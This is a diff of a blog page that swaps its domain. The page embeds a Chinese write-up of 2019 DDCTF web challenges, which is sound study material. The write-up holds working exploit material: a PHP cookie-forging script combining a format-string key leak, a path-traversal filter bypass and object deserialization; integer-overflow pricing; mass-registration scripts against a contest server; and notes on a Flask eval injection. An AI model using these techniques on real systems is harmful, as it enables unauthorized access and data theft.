@@ -178,16 +178,16 @@ $ddctf-&gt;index();
 ?&gt;
 得到key之后构造ddctfid:">
 <meta name="author" content="ch3n9w">
-<link rel="canonical" href="https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/">
+<link rel="canonical" href="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://ch3n9w.github.io/flash.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://ch3n9w.github.io/flash.ico">
-<link rel="icon" type="image/png" sizes="32x32" href="https://ch3n9w.github.io/flash.ico">
-<link rel="apple-touch-icon" href="https://ch3n9w.github.io/flash.ico">
-<link rel="mask-icon" href="https://ch3n9w.github.io/flash.ico">
+<link rel="icon" href="http://blog.dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://blog.dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://blog.dragonbox.top/flash.ico">
+<link rel="apple-touch-icon" href="http://blog.dragonbox.top/flash.ico">
+<link rel="mask-icon" href="http://blog.dragonbox.top/flash.ico">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/">
+<link rel="alternate" hreflang="en" href="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/">
 <noscript>
     <style>
         #theme-toggle,
@@ -396,13 +396,13 @@ $ddctf-&gt;index();
 ?&gt;
 得到key之后构造ddctfid:" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/" />
-<meta property="og:image" content="https://ch3n9w.github.io/image-20211114142123083.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/" />
+<meta property="og:image" content="http://blog.dragonbox.top/image-20211114142123083.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-05-11T13:58:05+00:00" />
 <meta property="article:modified_time" content="2019-05-11T13:58:05+00:00" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://ch3n9w.github.io/image-20211114142123083.png" />
+<meta name="twitter:image" content="http://blog.dragonbox.top/image-20211114142123083.png" />
 <meta name="twitter:title" content="2019 DDCTF web"/>
 <meta name="twitter:description" content="考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。
 web 签到题
@@ -585,13 +585,13 @@ $ddctf-&gt;index();
       "@type": "ListItem",
       "position":  1 ,
       "name": "Posts",
-      "item": "https://ch3n9w.github.io/posts/"
+      "item": "http://blog.dragonbox.top/posts/"
     }, 
     {
       "@type": "ListItem",
       "position":  2 ,
       "name": "2019 DDCTF web",
-      "item": "https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/"
+      "item": "http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/"
     }
   ]
 }
@@ -609,7 +609,7 @@ $ddctf-&gt;index();
   "articleBody": "考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。\nweb 签到题 点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。\n然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：\n\u003c?php Class Application { var $path = ''; public function response($data, $errMsg = 'success') { $ret = ['errMsg' =\u003e $errMsg, 'data' =\u003e $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) \u0026\u0026 $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) { $this-\u003eresponse('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; }else{ $this-\u003eresponse('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); } } private function sanitizepath($path) { $path = trim($path);//去掉空格 $path=str_replace('../','',$path);//过滤第一 $path=str_replace('..\\\\','',$path);//过滤第二 return $path; }// public function __destruct() { if(empty($this-\u003epath)) { exit(); }else{ $path = $this-\u003esanitizepath($this-\u003epath);// ....//config/flag.php if(strlen($path) !== 18) {//../config/flag.php exit(); } $this-\u003eresponse($data=file_get_contents($path),'Congratulations'); } exit(); } } ?\u003e \u003c?php include 'Application.php'; class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration\t= 7200; var $cookie_name = 'ddctf_id'; var $cookie_path\t= ''; var $cookie_domain\t= ''; var $cookie_secure\t= FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this-\u003eget_key(); if($this-\u003esession_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this-\u003esession_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this-\u003eeancrykey = file_get_contents('../config/key.txt'); } public function session_read() {//target1: 绕过所有false if(empty($_COOKIE)) { return FALSE; }//cookie not empty $session = $_COOKIE[$this-\u003ecookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; }//ddctf_id 不能为空 $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容 $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位 if($hash !== md5($this-\u003eeancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容 parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session);//ddctf_id 反序列化 if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path?? if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this-\u003eeancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =\u003e $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。 if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { parent::response('the ip addree not match'.'error'); return FALSE; }//ip_address 要写自己的ip if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; }//user_agent 内容要和 http_user_agent的匹配 return TRUE; }//看起来可以动手脚的只有session_id? private function session_create() { $sessionid = ''; while(strlen($sessionid) \u003c 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( 'session_id' =\u003e md5(uniqid($sessionid,TRUE)), 'ip_address' =\u003e $_SERVER['REMOTE_ADDR'], 'user_agent' =\u003e $_SERVER['HTTP_USER_AGENT'], 'user_data' =\u003e '', ); $cookiedata = serialize($ ); $cookiedata = $cookiedata.md5($this-\u003eeancrykey.$cookiedata); $expire = $this-\u003ecookie_expiration + time(); setcookie( $this-\u003ecookie_name, $cookiedata, $expire, $this-\u003ecookie_path, $this-\u003ecookie_domain, $this-\u003ecookie_secure ); } } $ddctf = new Session(); $ddctf-\u003eindex(); ?\u003e 得到key之后构造ddctfid:\n\u003c?php //nickname = %s $a = 'a:4:{s:10:\"session_id\";s:32:\"3f65fc339c032f85048e42f21fab4ef0\";s:10:\"ip_address\";s:14:\"211.137.22.191\";s:10:\"user_agent\";s:78:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\";s:9:\"user_data\";s:0:\"\";}'; $b = unserialize($a); class Application{ public $path = '....//config/flag.txt'; } $key = 'EzblrbNS'; $b['user_data'] = new Application; $d = serialize($b); echo urlencode($d.md5($key.$d)); 传参即可。\n大吉大利今晚吃鸡 遇到买东西的题目首先思路就是改变价格，通过抓包发现价格可以往大改而不能往小改。可以利用整数溢出0xffffffff+1，传参进去就买到了。 然后要淘汰100个人，实际上要淘汰149个人。脚本如下：\nimport requests import string import random import json import re url = 'http://117.51.147.155:5050' seq = [ 'register', 'login', 'balance', 'search_ticket', 'bill', 'buy', 'bill', 'pay'] url_seg = { 'register':'/ctf/api/register?name={0}\u0026password=11111111', 'login':'/ctf/api/login?name={0}\u0026password=11111111', 'balance':'/ctf/api/get_user_balance', 'search_ticket':'/ctf/api/search_ticket', 'bill':'/ctf/api/search_bill_info', 'buy':'/ctf/api/buy_ticket?ticket_price=4294967296', 'remove':'/ctf/api/remove_robot?id={0}\u0026ticket={1}', 'pay':'/ctf/api/pay_ticket?bill_id={0}'} session = requests.session() victiom ={ 1: '21cb23b38e33426812d68991dbb6ba68', 2: '6f89be1e66c9bd69bce99952aa009a96', 3: '70e1b0196609646efd0aacea613943d6', 4: '46f7f7e50b54a636f3aae60dd839590b', 5: '395b9fb4fb0f3cf42a727d43536be457', ··· ··· 147: '4cc522f84f11189d9737ab18fc22fcd0', 148: '8f2675372aa0f2ecfee1aeeee3d814cd', 149: '7544b9ee45ae6ae7066305d472077638'} def register_login_get_ticket(): global victiom global session while True: username = random.sample(string.letters, 19) username1 = ''.join(username) register1 = url_seg['register'].format(str(username1)) reg_url = url + register1 print reg_url res = session.get(reg_url).content if '\\u7528\\u6237\\u6ce8\\u518c\\u6210\\u529f' in res: log_url = url + url_seg['login'].format(username1) session.get(log_url) buy_url = url + url_seg['buy'] res = session.get(buy_url).content bill_url = url + url_seg['bill'] html = session.get(bill_url) jsonn = json.loads(html.text) bill_id = jsonn['data'][0]['bill_id'] pay_url = url + url_seg['pay'].format(bill_id) session.get(pay_url) sear_url = url + url_seg['search_ticket'] html = session.get(sear_url) res = html.content josnn = json.loads(html.text) id = josnn['data'][0]['id'] # 这个地方有点奇怪，josn解析不出ticket所以采用正则匹配的方式 ticket = re.search(\"ticket\\\":\\\"(.*?)\\\"\", res).group(1) victiom[id] = ticket print victiom if len(victiom) == 149: break def delete_other(): session = requests.session() regiter1 = url_seg['register'].format('ch5ser_cqw_cq') reg_url = url + regiter1 res = session.get(reg_url).content if '\\u7528\\u6237\\u6ce8\\u518c\\u6210\\u529f' in res: log_url = url + url_seg['login'].format('ch5ser_cqw_cq') session.get(log_url) buy_url = url + url_seg['buy'] res = session.get(buy_url).content bill_url = url + url_seg['bill'] html = session.get(bill_url) jsonn = json.loads(html.text) bill_id = jsonn['data'][0]['bill_id'] pay_url = url + url_seg['pay'].format(bill_id) session.get(pay_url) sear_url = url + url_seg['search_ticket'] html = session.get(sear_url) for key, value in victiom.items(): remove = url_seg['remove'].format(str(key), value) rem_url = url + remove print session.get(rem_url).content print session.get(\"http://117.51.147.155:5050/ctf/api/get_flag\").content def main(): # 注册过快可能会被封 register_login_get_ticket() delete_other() if __name__ == '__main__': main() 学长的脚本\nimport requests import json def reg(): for i in range(0,1000): url = \"http://117.51.147.155:5050/ctf/api/register?name=cic\"+str(i)+\"\u0026password=12345678\" html = requests.get(url) print(html.text) def get_ticket(i): s = requests.session() s.get(\"http://117.51.147.155:5050/ctf/api/login?name=cic\"+str(i)+\"\u0026password=12345678\") html = s.get(\"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296\") json1 = json.loads(html.text) ticketid = json1[\"data\"][0][\"bill_id\"] html1 = s.get(\"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=\"+ticketid) html2 = s.get(\"http://117.51.147.155:5050/ctf/api/search_ticket\") json2 = json.loads(html2.text) id = json2[\"data\"][0][\"id\"] ticket = json2[\"data\"][0][\"ticket\"] pack = {\"id\":id , \"ticket\":ticket} return pack def del_people(id,ticket): s = requests.session() s.get(\"http://117.51.147.155:5050/ctf/api/login?name=cic\u0026password=12345678\") html = s.get(\"http://117.51.147.155:5050/ctf/api/remove_robot?id=\"+str(id)+\"\u0026ticket=\"+ticket) print(html.text) if __name__ == '__main__': reg() #get_ticket() for i in range(0,1000): pack = get_ticket(i) id = pack[\"id\"] ticket = pack[\"ticket\"] print(id) print(ticket) del_people(id, ticket) #del_people(id,ticket) 滴 沙雕题目，要读取的文件.practice.txt.swp在线索网址的作者的另一篇博客中出现过，读取，获得源码，传递引用就可以了\n图片上传 上传一张图片，提示缺少字段phpinfo(),并显示出了上传后的图片，下载后放入010editor中比较发现文件被改动，比较发现特定位置上的字节并没有被改动，在该位置后面添加phpinfo()上传就有flag了。\nhomebrew event loop read the source code first\n# -*- encoding: utf-8 -*- # written in python 3.7 __author__ = 'garzon' from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = '*********************' # censored url_prefix = '/d5af31f66741e857' def FLAG(): return 'FLAG_is_here_but_i_wont_show_you' # censored # put event in a queue def trigger_event(event): session['log'].append(event) if len(session['log']) \u003e 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) # get the string between prefix and postfix def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None # handle a event everytime while len(request.event_queue) \u003e 0: event = request.event_queue[0] # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\" request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: # trigger_event%23;get_flag # 这个地方有意思，%23也就是井号是在拼接之后在eval的时候才触发的，而不是在拼接的时候立刻触发。而从下面来看，似乎井号的触发范围也封装在了event_handle里面了，而不会影响范围外的执行。 event_handler = eval(action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. ' resp += 'Go back to index.html\n' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp @app.route(url_prefix+'/') def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == '' or (not querystring.startswith('action:')) or len(querystring) \u003e 100: querystring = 'action:index;False#False' if 'num_items' not in session: session['num_items'] = 0 session['points'] = 3 session['log'] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = '' html += '[INFO] you have {} diamonds, {} points now.\n'.format(session['num_items'], session['points']) if page == 'index': html += '",
   "wordCount" : "1385",
   "inLanguage": "en",
-  "image":"https://ch3n9w.github.io/image-20211114142123083.png","datePublished": "2019-05-11T13:58:05Z",
+  "image":"http://blog.dragonbox.top/image-20211114142123083.png","datePublished": "2019-05-11T13:58:05Z",
   "dateModified": "2019-05-11T13:58:05Z",
   "author":{
     "@type": "Person",
@@ -617,14 +617,14 @@ $ddctf-&gt;index();
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/"
+    "@id": "http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/"
   },
   "publisher": {
     "@type": "Organization",
     "name": "ch3n9w の 超元域",
     "logo": {
       "@type": "ImageObject",
-      "url": "https://ch3n9w.github.io/flash.ico"
+      "url": "http://blog.dragonbox.top/flash.ico"
     }
   }
 }
@@ -646,8 +646,8 @@ $ddctf-&gt;index();
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://ch3n9w.github.io/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
-                <img src="https://ch3n9w.github.io/avatar.jpg" alt="" aria-label="logo"
+            <a href="http://blog.dragonbox.top/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
+                <img src="http://blog.dragonbox.top/avatar.jpg" alt="" aria-label="logo"
                     height="35">ch3n9w の 超元域</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
@@ -674,7 +674,7 @@ $ddctf-&gt;index();
         </div>
         <ul id="menu">
             <li>
-                <a href="https://ch3n9w.github.io/categories/" title="categories">
+                <a href="http://blog.dragonbox.top/categories/" title="categories">
                     <span>categories</span>
                 </a>
             </li>
@@ -685,7 +685,7 @@ $ddctf-&gt;index();
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="https://ch3n9w.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://ch3n9w.github.io/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="http://blog.dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="http://blog.dragonbox.top/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       2019 DDCTF web
     </h1>
@@ -694,8 +694,8 @@ $ddctf-&gt;index();
 </div>
   </header> 
 <figure class="entry-cover">
-        <img loading="eager" srcset="https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/image-20211114142123083_hu14124345416118700756.png 360w ,https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/image-20211114142123083_hu13734313669400506323.png 480w ,https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/image-20211114142123083_hu13677728818500619037.png 720w ,https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/image-20211114142123083_hu8167459465426229859.png 1080w ,https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/image-20211114142123083.png 1381w" 
-            sizes="(min-width: 768px) 720px, 100vw" src="https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/image-20211114142123083.png" alt="" 
+        <img loading="eager" srcset="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083_hu14124345416118700756.png 360w ,http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083_hu13734313669400506323.png 480w ,http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083_hu13677728818500619037.png 720w ,http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083_hu8167459465426229859.png 1080w ,http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083.png 1381w" 
+            sizes="(min-width: 768px) 720px, 100vw" src="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083.png" alt="" 
             width="1381" height="591">
         
 </figure><div class="toc">
@@ -1308,12 +1308,12 @@ $ddctf-&gt;index();
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="https://ch3n9w.github.io/posts/ctf-google-game/">
+  <a class="prev" href="http://blog.dragonbox.top/posts/ctf-google-game/">
     <span class="title">« Prev</span>
     <br>
     <span>Google_Game</span>
   </a>
-  <a class="next" href="https://ch3n9w.github.io/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+  <a class="next" href="http://blog.dragonbox.top/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
     <span class="title">Next »</span>
     <br>
     <span>流量分析</span>
@@ -1325,7 +1325,7 @@ $ddctf-&gt;index();
     </main>
     
 <footer class="footer">
-        <span>&copy; 2024 <a href="https://ch3n9w.github.io/">ch3n9w の 超元域</a></span> · 
+        <span>&copy; 2024 <a href="http://blog.dragonbox.top/">ch3n9w の 超元域</a></span> · 
 
     <span>
         Powered by
